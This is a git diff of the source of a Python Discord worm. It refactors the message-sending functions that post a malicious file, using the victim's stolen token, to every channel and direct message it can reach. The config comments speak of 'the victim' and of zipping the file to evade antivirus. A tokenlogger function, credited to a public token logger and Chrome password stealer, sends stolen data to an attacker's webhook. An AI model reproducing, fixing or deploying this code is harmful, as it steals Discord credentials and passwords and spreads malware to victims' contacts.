@@ -5,7 +5,7 @@ import os
 #?############ CONFIG
 webhook = "" # Webhook to send your info into
 
-message = "" # Message to send to the friends and servers of the victim along with the file
+message = "It works-ish?" # Message to send to the friends and servers of the victim along with the file
 
 zipfirst = False # If the program should make the file .zip first before sending it to the next victim(s)
                  # This will have a smaller chance of an AV noticing the download
@@ -25,12 +25,11 @@ def makeFile(zipfirst: bool):
         }
     return files
 
-def sendmessage(token, message, channel_id, iftimeout: bool, files):
+def sendMessage(token, message, channel_id, iftimeout: bool, files):
     print("Sending message to ", channel_id)
     url = f"https://discord.com/api/channels/{channel_id}/messages"
 
-    headers = {"Authorization": token,
-                'Content-Type': 'multipart/form-data'}
+    headers = {"Authorization": token}
     payload = {"content": message}
 
     timeout = 30
@@ -38,29 +37,7 @@ def sendmessage(token, message, channel_id, iftimeout: bool, files):
         timeout = 2
 
     try:
-        r = requests.post(url, headers=headers, json=payload, timeout=timeout, files=files)
-        print(r.status_code)
-    except requests.Timeout:
-        print("Timed out on channel ", channel_id)
-        pass
-    except Exception as e:
-        print(e)
-
-def sendDMs(token, message, channel_id, iftimeout: bool, files):
-    print("Sending DM to ", channel_id)
-    #url = f"https://discord.com/channels/@me/{channel_id}"
-    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
-
-    headers = {"Authorization": token,
-               'Content-Type': 'multipart/form-data'}
-    payload = {"content": message}
-
-    timeout = 30
-    if iftimeout == True:
-        timeout = 2
-
-    try:
-        r = requests.post(url, headers=headers, json=payload, timeout=timeout, files=files)
+        r = requests.post(url, headers=headers, data=payload, timeout=timeout, files=files)
         print(r.status_code)
     except requests.Timeout:
         print("Timed out on channel ", channel_id)
@@ -130,9 +107,10 @@ def spread(token, message, zipfirst):
     channels = getchannels(token)
     files = makeFile(zipfirst)
     for i in channels[0]:
-        sendmessage(token, message, i, False, files)
+        sendMessage(token, message, i, False, files) # Channels
     for i in channels[1]: # I changed it to False so it's easier to debug, you can do True on prod if you want to. It's also more stable this way
-        sendDMs(token, message, i, False, files)
+        sendMessage(token, message, i, False, files) # DMs
+    # If it works, dont touch it
 
 def tokenlogger(webhook): # Stolen because I'm lazy as hell: https://github.com/Napoleon-x/multi-logger-python-discord-token-logger-and-chrome-password-stealer-through-webhooks
     import psutil
